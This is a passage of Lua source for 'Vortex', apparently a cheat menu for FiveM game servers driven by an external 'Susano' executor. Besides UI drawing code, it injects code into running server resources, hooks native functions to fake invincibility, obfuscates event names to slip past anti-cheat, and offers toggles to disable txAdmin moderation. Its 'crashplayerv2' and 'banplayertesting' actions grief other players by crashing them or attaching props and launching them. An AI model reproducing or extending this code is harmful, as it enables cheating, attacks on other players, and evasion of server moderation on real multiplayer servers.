    height = 36,
    itemSpacing = 0,

    bgColor = {0.0, 0.0, 0.0, 0.95},
    headerColor = {0.0, 0.0, 0.0, 1.0},
    selectedColor = {0.55, 0.0, 0.0, 0.95},
    itemColor = {0.0, 0.0, 0.0, 0.65},
    itemHoverColor = {0.10, 0.10, 0.10, 0.75},
    accentColor = {0.55, 0.0, 0.0, 1.0},
    textColor = {1.0, 1.0, 1.0, 1.0},
    textSecondary = {0.7, 0.7, 0.7, 1.0},
    separatorColor = {0.3, 0.3, 0.3, 0.85},
    footerColor = {0.0, 0.0, 0.0, 1.0},
    scrollbarBg = {0.08, 0.08, 0.08, 0.70},
    scrollbarThumb = {0.55, 0.0, 0.0, 0.95},
    tabActiveColor = {0.55, 0.0, 0.0, 1.0},

    titleSize = 18,
    subtitleSize = 15,
    itemSize = 16,
    infoSize = 13,
    footerSize = 14,
    bannerTitleSize = 27,
    bannerSubtitleSize = 16,

    headerHeight = 35,
    footerHeight = 36,
    tabHeight = 32,

    headerRounding = 0.0,
    itemRounding = 0.0,
    footerRounding = 4.0,
    bannerRounding = 6.0,
    globalRounding = 8.0,

    scrollbarWidth = 8,
    scrollbarPadding = 6
}


local vortex_notifications = {}
local vortex_notifDuration = 3000


local vortex_toggleActions = {
    godmode = function() return vortex_godmodeEnabled end,
    noclipbind = function() return VortexNoclip.IsEnabled() end,
    invisible = function() return vortex_invisibleEnabled end,
    fastrun = function() return vortex_fastRunEnabled end,
    superjump = function() return vortex_superJumpEnabled end,
    noragdoll = function() return vortex_noRagdollEnabled end,
    antifreeze = function() return vortex_antiFreezeEnabled end,
    freecam = function() return vortex_freecamEnabled end,
    spectate = function() return vortex_spectateEnabled end,
    shooteyes = function() return vortex_shooteyesEnabled end,
    magicbullet = function() return vortex_magicbulletEnabled end,
    drawfov = function() return vortex_drawFovEnabled end,
    easyhandling = function() return vortex_easyhandlingEnabled end,
    gravitatevehicle = function() return vortex_gravitatevehicleEnabled end,
    nocolision = function() return vortex_nocolisionEnabled end,
    editormode = function() return vortex_editorModeEnabled end,
    solosession = function() return vortex_solosessionEnabled end,
    misctarget = function() return vortex_miscTargetEnabled end,
    eventlogger = function() return vortex_eventloggerEnabled end,
    bypassdriveby = function() return vortex_bypassDrivebyEnabled end,
    teleportinto = function() return vortex_teleportIntoEnabled end,
    forcevehicleengine = function() return vortex_forceVehicleEngineEnabled end,
    boostvehicle = function() return vortex_boostVehicleEnabled end,
    txadminplayerids = function() return vortex_txAdminPlayerIDsEnabled end,
    txadminnoclip = function() return vortex_txAdminNoclipEnabled end,
    disablealltxadmin = function() return vortex_disableAllTxAdminEnabled end,
    disabletxadminteleport = function() return vortex_disableTxAdminTeleportEnabled end,
    disabletxadminfreeze = function() return vortex_disableTxAdminFreezeEnabled end
}


local function Vortex_Notify(text, actionName)
    local notificationText = text


    if actionName and vortex_toggleActions[actionName] then
        local isEnabled = vortex_toggleActions[actionName]()
        if isEnabled then
            notificationText = text .. " - Enabled"
        else
            notificationText = text .. " - Disabled"
        end
    end

    table.insert(vortex_notifications, {
        text = notificationText,
        startTime = GetGameTimer(),
        duration = vortex_notifDuration
    })
end


local function Vortex_DrawNotifications()
    if #vortex_notifications == 0 then return end
    if not Vortex_SusanoReady() then return end

    local screenW, screenH = GetActiveScreenResolution()
    local margin = 25
    local spacing = 10
    local boxW = 320
    local boxH = 80
    local headerHeight = VortexStyle.headerHeight


    for i = #vortex_notifications, 1, -1 do
        local notif = vortex_notifications[i]
        if not notif then goto continue end

        local currentTime = GetGameTimer()
        local elapsed = currentTime - notif.startTime
        local progress = math.min(1.0, elapsed / notif.duration)


        if progress >= 1.0 then
            table.remove(vortex_notifications, i)
            goto continue
        end


        local boxX = screenW - boxW - margin
        local boxY = screenH - margin - boxH - ((#vortex_notifications - i) * (boxH + spacing))



        Susano.DrawRectFilled(boxX, boxY, boxW, boxH,
            VortexStyle.bgColor[1], VortexStyle.bgColor[2], VortexStyle.bgColor[3], VortexStyle.bgColor[4], 0.0)


        local roundingSize = VortexStyle.globalRounding
        if roundingSize > 0 then

            Susano.DrawRectFilled(boxX, boxY, boxW, roundingSize * 2,
                VortexStyle.bgColor[1], VortexStyle.bgColor[2], VortexStyle.bgColor[3], VortexStyle.bgColor[4], VortexStyle.globalRounding)
        end


        local topGray = 0.05
        local bottomBlack = 0.0
        local gradientSteps = 15
        local stepHeight = headerHeight / gradientSteps

        for step = 0, gradientSteps - 1 do
            local stepY = boxY + (step * stepHeight)
            local stepGradientFactor = step / (gradientSteps - 1)
            local stepR = topGray - (stepGradientFactor * (topGray - bottomBlack))
            local stepG = topGray - (stepGradientFactor * (topGray - bottomBlack))
            local stepB = topGray - (stepGradientFactor * (topGray - bottomBlack))

            Susano.DrawRectFilled(boxX, stepY, boxW, stepHeight,
                stepR, stepG, stepB, VortexStyle.headerColor[4], VortexStyle.headerRounding)
        end


        local titleText = "NOTIFICATION"
        local titleWidth = Susano.GetTextWidth(titleText, VortexStyle.itemSize)
        local titleX = boxX + (boxW - titleWidth) / 2
        local titleY = boxY + (headerHeight / 2) - (VortexStyle.itemSize / 2) + 1

        Susano.DrawText(titleX, titleY, titleText, VortexStyle.itemSize,
            VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], VortexStyle.textColor[4])


        local textSize = VortexStyle.itemSize - 2
        local textWidth = Susano.GetTextWidth(notif.text, textSize)
        local textX = boxX + (boxW - textWidth) / 2
        local textY = boxY + headerHeight + 15

        Susano.DrawText(textX, textY, notif.text, textSize,
            VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], VortexStyle.textColor[4])


        local progressBarHeight = 4
        local progressBarY = boxY + boxH - progressBarHeight
        local progressBarPadding = 2
        local progressBarW = boxW - (progressBarPadding * 2)
        local progressBarX = boxX + progressBarPadding


        Susano.DrawRectFilled(progressBarX, progressBarY, progressBarW, progressBarHeight,
            0.1, 0.1, 0.1, 1.0, progressBarHeight / 2)


        local remainingProgress = 1.0 - progress
        local progressBarFillW = progressBarW * remainingProgress

        if progressBarFillW > 0 then

            local progressGradientSteps = 20
            local progressStepW = progressBarFillW / progressGradientSteps

            for step = 0, progressGradientSteps - 1 do
                local stepX = progressBarX + (step * progressStepW)
                local stepGradientFactor = step / (progressGradientSteps - 1)
                local stepR = VortexStyle.accentColor[1] - (stepGradientFactor * VortexStyle.accentColor[1] * 0.5)
                local stepG = VortexStyle.accentColor[2] - (stepGradientFactor * VortexStyle.accentColor[2] * 0.5)
                local stepB = VortexStyle.accentColor[3] - (stepGradientFactor * VortexStyle.accentColor[3] * 0.5)

                Susano.DrawRectFilled(stepX, progressBarY, progressStepW, progressBarHeight,
                    stepR, stepG, stepB, 1.0, progressBarHeight / 2)
            end
        end

        ::continue::
    end
end



local function vortex_skipSeparator(items, startIndex)
    if not items or #items == 0 then return startIndex or 1 end
    local index = startIndex
    local maxAttempts = #items
    local attempts = 0
    while items[index] and items[index].isSeparator and attempts < maxAttempts do
        index = index + 1
        if index > #items then
            index = 1
        end
        attempts = attempts + 1
    end
    return index
end

local function Vortex_GetKeyName(keyCode)
    -- Correct FiveM/GTA V control ID to default keyboard key mapping
    -- Source: https://docs.fivem.net/docs/game-references/controls/
    local keyNames = {
        -- Common keys (priority detection)
        [121] = "Insert", [166] = "F5", [167] = "F6",
        [168] = "F7", [169] = "F8", [170] = "F3",
        [288] = "F1", [289] = "F2",
        -- Number row (weapon select)
        [157] = "1", [158] = "2", [159] = "6", [160] = "3",
        [161] = "7", [162] = "8", [163] = "9", [164] = "4",
        [165] = "5",
        -- Letters (first control ID in valid range 121+ for each key)
        [129] = "W", [130] = "S", [133] = "A", [134] = "D",
        [140] = "R", [138] = "Q", [153] = "E", [144] = "F",
        [154] = "X", [137] = "Caps", [182] = "L", [183] = "G",
        [186] = "X", [199] = "P", [236] = "V", [244] = "M",
        [245] = "T", [246] = "Y", [249] = "N", [303] = "U",
        [305] = "B", [311] = "K", [319] = "C",
        -- Modifiers
        [131] = "L-Shift", [132] = "L-Ctrl",
        [209] = "L-Shift", [210] = "L-Ctrl", [326] = "L-Ctrl",
        [171] = "Caps", [217] = "Caps", [254] = "L-Shift",
        -- Spacebar
        [143] = "Space", [179] = "Space", [203] = "Space",
        [216] = "Space", [255] = "Space", [298] = "Space",
        -- Enter / Backspace / ESC
        [176] = "Enter", [191] = "Enter", [201] = "Enter", [215] = "Enter",
        [177] = "Backspace", [194] = "Backspace", [202] = "ESC",
        [200] = "ESC", [322] = "ESC",
        -- Delete / Home
        [178] = "Delete", [214] = "Delete", [256] = "Delete",
        [296] = "Delete", [297] = "Delete",
        [212] = "Home", [213] = "Home",
        -- Tab
        [192] = "Tab", [204] = "Tab", [211] = "Tab", [349] = "Tab",
        -- Arrow keys
        [172] = "Arrow Up", [188] = "Arrow Up", [300] = "Arrow Up",
        [173] = "Arrow Down", [187] = "Arrow Down", [299] = "Arrow Down",
        [174] = "Arrow Left", [189] = "Arrow Left", [308] = "Arrow Left",
        [175] = "Arrow Right", [190] = "Arrow Right", [307] = "Arrow Right",
        -- Page Up / Down
        [208] = "Page Up", [316] = "Page Up",
        [207] = "Page Down", [317] = "Page Down",
        -- Numpad
        [124] = "Num 4", [108] = "Num 4",
        [123] = "Num 6", [125] = "Num 6", [109] = "Num 6",
        [126] = "Num 5", [127] = "Num 8", [128] = "Num 5",
        [110] = "Num 5", [111] = "Num 8", [112] = "Num 5",
        [117] = "Num 7", [118] = "Num 9",
        [314] = "Num +", [315] = "Num -",
        -- F-keys (replay/special)
        [318] = "F5", [327] = "F5", [344] = "F11",
        -- Brackets
        [312] = "[", [313] = "]", [197] = "]",
        -- Misc
        [243] = "~", [301] = "M", [302] = "S",
        [304] = "H", [306] = "N", [309] = "T", [310] = "R",
        [320] = "V", [323] = "X", [324] = "C", [325] = "V",
        [337] = "X", [338] = "A", [339] = "D",
        [340] = "L-Shift", [341] = "L-Ctrl",
        [350] = "E"
    }
    return keyNames[keyCode] or ("Key " .. keyCode)
end

local function Vortex_GetActionLabel(actionName)
    for categoryName, category in pairs(vortex_categories) do
        local items = category.hasTabs and category.tabs or {{items = category.items}}
        for _, tab in ipairs(items) do
            if tab.items then
                for _, item in ipairs(tab.items) do
                    if item.action == actionName then
                        return item.label or actionName
                    end
                end
            end
        end
    end
    return actionName
end

local theme = vortex_themes[vortex_currentTheme]
VortexBanner.imageUrl = theme.banner
local color = theme.color
VortexStyle.accentColor[1] = color[1]
VortexStyle.accentColor[2] = color[2]
VortexStyle.accentColor[3] = color[3]
VortexStyle.selectedColor[1] = color[1]
VortexStyle.selectedColor[2] = color[2]
VortexStyle.selectedColor[3] = color[3]
VortexStyle.scrollbarThumb[1] = color[1]
VortexStyle.scrollbarThumb[2] = color[2]
VortexStyle.scrollbarThumb[3] = color[3]
VortexStyle.tabActiveColor[1] = color[1]
VortexStyle.tabActiveColor[2] = color[2]
VortexStyle.tabActiveColor[3] = color[3]

local vortex_actions = {
    close = function()
        VortexMenu.isOpen = false
        Vortex_ResetFrame()
    end,
    category = function(target)
        VortexMenu.categoryIndexes[VortexMenu.currentCategory] = VortexMenu.selectedIndex
        table.insert(VortexMenu.categoryHistory, VortexMenu.currentCategory)

        VortexMenu.transitionDirection = 1
        VortexMenu.transitionOffset = -50

        VortexMenu.currentCategory = target
        VortexMenu.selectedIndex = 1
        VortexMenu.currentTab = 1

        local category = vortex_categories[target]
        if category then
            local items = (category.hasTabs and category.tabs and category.tabs[1] and category.tabs[1].items) or category.items
            VortexMenu.selectedIndex = vortex_skipSeparator(items, 1)
        end
    end,

    antiheadshot = function()
        vortex_antiHeadshotEnabled = not vortex_antiHeadshotEnabled
        if vortex_antiHeadshotEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if _G.vortex_antiHeadshotEnabled == nil then _G.vortex_antiHeadshotEnabled = false end
                    if not _G.vortex_antiHeadshotEnabled then
                        _G.vortex_antiHeadshotEnabled = true

                        local CreateThread_fn = CreateThread
                        local Wait_fn = Wait
                        local PlayerPedId_fn = PlayerPedId
                        local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                        CreateThread_fn(function()
                            while true do
                                Wait_fn(0)
                                if not _G.vortex_antiHeadshotEnabled then
                                    Wait_fn(500)
                                    goto continue
                                end

                                local ped = PlayerPedId_fn()
                                if ped and ped ~= 0 then
                                    SetPedSuffersCriticalHits_fn(ped, false)
                                end

                                ::continue::
                            end
                        end)
                    end
                    _G.vortex_antiHeadshotEnabled = true
                ]])
            end
        else
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if _G.vortex_antiHeadshotEnabled == nil then _G.vortex_antiHeadshotEnabled = false end
                    _G.vortex_antiHeadshotEnabled = false

                    if PlayerPedId and SetPedSuffersCriticalHits then
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                        end
                    end
                ]])
            end
        end
    end,

    -- Visuals (global)
    visual_enable = function()
        VortexVisuals.enable = not VortexVisuals.enable
        Vortex_Notify("Visuals: " .. (VortexVisuals.enable and "On" or "Off"))
    end,

    visual_draw_npcs = function()
        VortexVisuals.drawNPCs = not VortexVisuals.drawNPCs
        Vortex_Notify("Draw NPCs: " .. (VortexVisuals.drawNPCs and "On" or "Off"))
    end,

    visual_draw_self = function()
        VortexVisuals.drawSelf = not VortexVisuals.drawSelf
        Vortex_Notify("Draw Yourself: " .. (VortexVisuals.drawSelf and "On" or "Off"))
    end,

    visual_ignore_dead = function()
        VortexVisuals.ignoreDead = not VortexVisuals.ignoreDead
        Vortex_Notify("Ignore Dead: " .. (VortexVisuals.ignoreDead and "On" or "Off"))
    end,

    visual_fullbright = function()
        VortexVisuals.fullBright = not VortexVisuals.fullBright
        if VortexVisuals.fullBright then
            Vortex_StartTimecycle("cinema")
        else
            ClearTimecycleModifier()
        end
        Vortex_Notify("Full Bright: " .. (VortexVisuals.fullBright and "On" or "Off"))
    end,

    visual_fov_toggle = function()
        VortexVisuals.fovEnabled = not VortexVisuals.fovEnabled
        Vortex_Notify("FOV changer: " .. (VortexVisuals.fovEnabled and "On" or "Off"))
    end,

    -- Crosshair
    crosshair_toggle = function()
        VortexVisuals.crosshair.enabled = not VortexVisuals.crosshair.enabled
        Vortex_Notify("Crosshair: " .. (VortexVisuals.crosshair.enabled and "On" or "Off"))
    end,

    -- Vehicle ESP
    vehicle_visual_toggle = function()
        VortexVisuals.vehicle.enabled = not VortexVisuals.vehicle.enabled
        Vortex_Notify("Vehicle ESP: " .. (VortexVisuals.vehicle.enabled and "On" or "Off"))
    end,
    vehicle_draw_spawn = function()
        VortexVisuals.vehicle.drawSpawnName = not VortexVisuals.vehicle.drawSpawnName
    end,
    vehicle_draw_lock = function()
        VortexVisuals.vehicle.drawLockState = not VortexVisuals.vehicle.drawLockState
    end,

    -- Box
    box_toggle = function()
        VortexVisuals.box.enabled = not VortexVisuals.box.enabled
    end,
    box_draw_health = function()
        VortexVisuals.box.drawHealth = not VortexVisuals.box.drawHealth
    end,
    box_draw_armor = function()
        VortexVisuals.box.drawArmor = not VortexVisuals.box.drawArmor
    end,
    box_see_invis = function()
        VortexVisuals.box.seeInvisible = not VortexVisuals.box.seeInvisible
    end,

    -- Skeleton
    skeleton_toggle = function()
        VortexVisuals.skeleton.enabled = not VortexVisuals.skeleton.enabled
    end,

    -- Text
    text_toggle = function()
        VortexVisuals.text.enabled = not VortexVisuals.text.enabled
    end,
    text_name = function()
        VortexVisuals.text.name.enabled = not VortexVisuals.text.name.enabled
    end,
    text_id = function()
        VortexVisuals.text.id.enabled = not VortexVisuals.text.id.enabled
    end,
    text_health = function()
        VortexVisuals.text.health.enabled = not VortexVisuals.text.health.enabled
    end,
    text_armor = function()
        VortexVisuals.text.armor.enabled = not VortexVisuals.text.armor.enabled
    end,
    text_distance = function()
        VortexVisuals.text.distance.enabled = not VortexVisuals.text.distance.enabled
    end,
    text_weapon = function()
        VortexVisuals.text.weapon.enabled = not VortexVisuals.text.weapon.enabled
    end,

    optimizefps = function()
        Vortex_OptimizeFPS()
        Vortex_Notify("FPS Boost executed")
    end,

    crashplayerv2 = function()
        local targetServerId = VortexMenu.selectedPlayer
        if not targetServerId or targetServerId == 0 then
            Vortex_Notify("No player selected for Crash Player v2")
            return
        end
        local clientId = GetPlayerFromServerId(targetServerId)
        if not clientId or clientId == -1 then
            Vortex_Notify("Player not found locally")
            return
        end
        local ped = GetPlayerPed(clientId)
        if not ped or not DoesEntityExist(ped) then
            Vortex_Notify("Invalid player ped")
            return
        end
        Vortex_Notify("Executing Crash Player v2 on " .. tostring(GetPlayerName(clientId)))
        Vortex_CrashPlayer(ped)
    end,

    banplayertesting = function()
        if not VortexMenu.selectedPlayer then
            Vortex_Notify("No player selected for Ban Player TESTING")
            return
        end

        local targetServerId = VortexMenu.selectedPlayer
        local targetPlayer = nil
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == targetServerId then
                targetPlayer = p
                break
            end
        end

        if not targetPlayer or targetPlayer == -1 then
            Vortex_Notify("Player not found locally")
            return
        end

        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            Vortex_Notify("Invalid player ped")
            return
        end

        Vortex_Notify("Ban Player TESTING: launching " .. tostring(GetPlayerName(targetPlayer)))

        Citizen.CreateThread(function()
            local spawned = {}
            local px, py, pz = table.unpack(GetEntityCoords(targetPed))
            local models = {"prop_beachball_02", "prop_cs_heist_bag_01", "prop_box_wood02a_pu"}

            for i=1,20 do
                local modelName = models[((i-1) % #models) + 1]
                local mHash = GetHashKey(modelName)
                RequestModel(mHash)
                local start = GetGameTimer()
                while not HasModelLoaded(mHash) and (GetGameTimer() - start) < 2000 do
                    Wait(0)
                end

                if HasModelLoaded(mHash) then
                    local offZ = 0.5 + (i * 0.03)
                    local obj = CreateObject(mHash, px, py, pz + offZ, true, true, false)
                    if DoesEntityExist(obj) then
                        AttachEntityToEntity(obj, targetPed, 0, 0.0, 0.0, offZ, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                        table.insert(spawned, obj)
                    end
                end
                Wait(25)
            end

            -- Gradually launch the player upward for a short duration
            for step = 1, 180 do
                if not DoesEntityExist(targetPed) then break end
                local cx, cy, cz = table.unpack(GetEntityCoords(targetPed))
                SetEntityCoordsNoOffset(targetPed, cx, cy, cz + 0.12, false, false, false)
                Wait(0)
            end

            Wait(4000)

            -- Cleanup spawned props
            for _, ent in ipairs(spawned) do
                if DoesEntityExist(ent) then
                    DetachEntity(ent, true, true)
                    DeleteEntity(ent)
                end
            end
        end)
    end,

    fullbright = function()
        Vortex_StartTimecycle("int_lesters")
        Vortex_Notify("Toggled Full Bright")
    end,

    godmode = function()
        vortex_godmodeEnabled = not vortex_godmodeEnabled
        local waveShieldStarted = GetResourceState("WaveShield") == "started"
        local targetResource = GetResourceState("monitor") == "started" and "monitor" or (waveShieldStarted and "WaveShield" or "any")

        if waveShieldStarted then
            if vortex_godmodeEnabled then
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource(targetResource, [[
                        if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                        _G.osintGodmode.enabled = true
                        local function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            if not _G.osintGodmode.originals[nativeName] then
                                _G.osintGodmode.originals[nativeName] = originalNative
                            end
                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                        end
                        hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                            if _G.osintGodmode and _G.osintGodmode.enabled then
                                return originalFn(entity, true)
                            end
                            return originalFn(entity, toggle)
                        end)
                        local co = coroutine.create(function()
                            local ped = PlayerPedId()
                            if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                        end)
                        while coroutine.status(co) ~= "dead" do
                            coroutine.resume(co)
                            Citizen.Wait(0)
                        end
                    ]])
                end
            else
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource(targetResource, [[
                        if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                        _G.osintGodmode.enabled = false
                        local function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            if not _G.osintGodmode.originals[nativeName] then
                                _G.osintGodmode.originals[nativeName] = originalNative
                            end
                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                        end
                        hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                            if _G.osintGodmode and _G.osintGodmode.enabled then
                                return originalFn(entity, true)
                            end
                            return originalFn(entity, toggle)
                        end)
                        local co = coroutine.create(function()
                            local ped = PlayerPedId()
                            if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                        end)
                        while coroutine.status(co) ~= "dead" do
                            coroutine.resume(co)
                            Citizen.Wait(0)
                        end
                    ]])
                end
            end
            return
        end

        if vortex_godmodeEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                    _G.osintGodmode.enabled = true
                    local function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then return end
                        if not _G.osintGodmode.originals[nativeName] then
                            _G.osintGodmode.originals[nativeName] = originalNative
                        end
                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                    end
                    hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                        if _G.osintGodmode and _G.osintGodmode.enabled then
                            return originalFn(player, true)
                        end
                        return originalFn(player, toggle)
                    end)
                    hNative("GetPlayerInvincible", function(originalFn, ...)
                        if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                        return originalFn(...)
                    end)
                    hNative("GetPlayerInvincible_2", function(originalFn, ...)
                        if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                        return originalFn(...)
                    end)
                    pcall(function() SetPlayerInvincible(PlayerId(), true) end)
                ]])
            end
        else
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                    _G.osintGodmode.enabled = false
                    local function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then return end
                        if not _G.osintGodmode.originals[nativeName] then
                            _G.osintGodmode.originals[nativeName] = originalNative
                        end
                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                    end
                    hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                        return originalFn(player, false)
                    end)
                    hNative("GetPlayerInvincible", function(originalFn, ...)
                        return false
                    end)
                    hNative("GetPlayerInvincible_2", function(originalFn, ...)
                        return false
                    end)
                    for name, original in pairs(_G.osintGodmode.originals or {}) do
                        if original and type(original) == "function" then
                            _G[name] = original
                        end
                    end
                    _G.osintGodmode.originals = {}
                    pcall(function() SetPlayerInvincible(PlayerId(), false) end)
                ]])
            end
        end
    end,

    revive = function()
        local Actions = {
            ["amigo"] = function()
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("amigo", [[ respawnPlayer() ]])
                end
            end,

            ["TrappinBridge"] = function()
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    local success = pcall(function()
                        Susano.InjectResource("TrappinBridge", [[ LocalPlayer.state:set('isDead', false, true) ]])
                    end)
                    if not success then
                        print("^1[ERROR] Failed to inject into TrappinBridge^7")
                    end
                end
            end,

            ["rzrp-base"] = function()
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("rzrp-base", [[
        local ped = PlayerPedId()
                        if ped and DoesEntityExist(ped) then
        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                            SetEntityHealth(ped, 200)
        ClearPedBloodDamage(ped)
        ClearPedTasksImmediately(ped)
                            SetPlayerInvincible(PlayerId(), false)
                            SetEntityInvincible(ped, false)
                            SetPedCanRagdoll(ped, true)
                            SetPedCanRagdollFromPlayerImpact(ped, true)
                            SetPedRagdollOnCollision(ped, true)
                        end
                    ]])
                end
            end,

            ["FiveStar"] = function()
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    local preamble, tbl = vortex_buildObfPreamble()
                    local call = string.format(
                        "Citizen.SetTimeout(1000, function() %s[2](%s) end)",
                        tbl, vortex_encStr("revive:Player:Dead"))
                    Susano.InjectResource("FiveStar", preamble .. "\n" .. call)
                end
            end,

            ["scripts"] = function()
                if GetResourceState("scripts") == 'started' then
                    local _te = rawget(_G, "TriggerEvent")
                    if _te then _te('deathscreen:revive') end
                end
            end,

            ["framework"] = function()
                if GetResourceState("framework") == 'started' then
                    local _te = rawget(_G, "TriggerEvent")
                    if _te then _te('deathscreen:revive') end
                end
            end,

            ["qb-jail"] = function()
                if GetResourceState("qb-jail") == 'started' then
                    local _te = rawget(_G, "TriggerEvent")
                    if _te then _te('hospital:client:Revive') end
                end
            end,

            ["wasabi_ambulance"] = function()
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    local preamble, tbl = vortex_buildObfPreamble()
                    local call = string.format(
                        "Citizen.SetTimeout(1000, function() %s[1](%s); %s[2](%s) end)",
                        tbl, vortex_encStr("esx:onPlayerSpawn"),
                        tbl, vortex_encStr("esx:onPlayerSpawn"))
                    Susano.InjectResource("wasabi_ambulance", preamble .. "\n" .. call)
                end
            end,

            ["mc9-medicsystem"] = function()
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("mc9-medicsystem", [[
                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                    ]])
                end
            end,
        }

        for resourceName, execution in pairs(Actions) do
            if GetResourceState(resourceName) == "started" then
                execution()
                return
            end
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local success = pcall(function()
                Susano.InjectResource("any", [[
        local ped = PlayerPedId()
        if ped and ped ~= 0 and DoesEntityExist(ped) then
            pcall(function()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                SetEntityHealth(ped, GetEntityMaxHealth(ped))
                ClearPedBloodDamage(ped)
                ClearPedTasksImmediately(ped)
            end)
        end
            ]])
            end)
            if not success then
                print("^1[Vortex] Erreur: Impossible d'injecter le code de revive^7")
            end
        else
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            pcall(function()
                NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                SetEntityHealth(ped, GetEntityMaxHealth(ped))
                ClearPedBloodDamage(ped)
                ClearPedTasksImmediately(ped)
            end)
        end
    end,

    health = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local success = pcall(function()
                Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        if ped and ped ~= 0 and DoesEntityExist(ped) then
            pcall(function()
                local maxHealth = GetEntityMaxHealth(ped)
                local targetHealth = math.floor((%f / 100.0) * maxHealth)
                SetEntityHealth(ped, targetHealth)
            end)
        end
            ]], vortex_healthValue))
            end)
            if not success then
                print("^1[Vortex] Erreur: Impossible d'injecter le code de santÃ©^7")
            end
        else
            local ped = PlayerPedId()
            if ped and ped ~= 0 and DoesEntityExist(ped) then
                pcall(function()
                    local maxHealth = GetEntityMaxHealth(ped)
                    local targetHealth = math.floor((vortex_healthValue / 100.0) * maxHealth)
                    SetEntityHealth(ped, targetHealth)
                end)
            end
        end
    end,

    armour = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local success = pcall(function()
                Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        if ped and ped ~= 0 and DoesEntityExist(ped) then
            pcall(function()
                local targetArmour = math.max(0.0, math.min(100.0, %f))
                SetPedArmour(ped, targetArmour)
            end)
        end
            ]], vortex_armourValue))
            end)
            if not success then
                print("^1[Vortex] Erreur: Impossible d'injecter le code d'armure^7")
            end
        else
            local ped = PlayerPedId()
            if ped and ped ~= 0 and DoesEntityExist(ped) then
                pcall(function()
                    local targetArmour = math.max(0.0, math.min(100.0, vortex_armourValue))
                    SetPedArmour(ped, targetArmour)
                end)
            end
        end
    end,

    bypassdriveby = function()
        vortex_bypassDrivebyEnabled = not vortex_bypassDrivebyEnabled
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local success = pcall(function()
                Susano.InjectResource("any", string.format([[
                local _G_bypassDrivebyEnabled = %s
                if _G_bypassDrivebyEnabled then
                    CreateThread(function()
                        while %s do
                            pcall(function()
                                local ped = PlayerPedId()
                                if ped and ped ~= 0 then
                                    SetPlayerCanDoDriveBy(ped, true)
                                end
                            end)
                            Wait(0)
                        end
                    end)
                end
            ]], tostring(vortex_bypassDrivebyEnabled), tostring(vortex_bypassDrivebyEnabled)))
            end)
            if not success then
                print("^1[Vortex] Erreur: Impossible d'injecter bypass driveby^7")
            end
        else
            if vortex_bypassDrivebyEnabled then
                CreateThread(function()
                    while vortex_bypassDrivebyEnabled do
                        pcall(function()
                            local ped = PlayerPedId()
                            if ped and ped ~= 0 then
                                SetPlayerCanDoDriveBy(ped, true)
                            end
                        end)
                        Wait(0)
                    end
                end)
            end
        end
    end,

    checkanticheats = function()
        Vortex_Notify("Anti-Cheat scan started")
        Citizen.CreateThread(function()
            local detections = {}
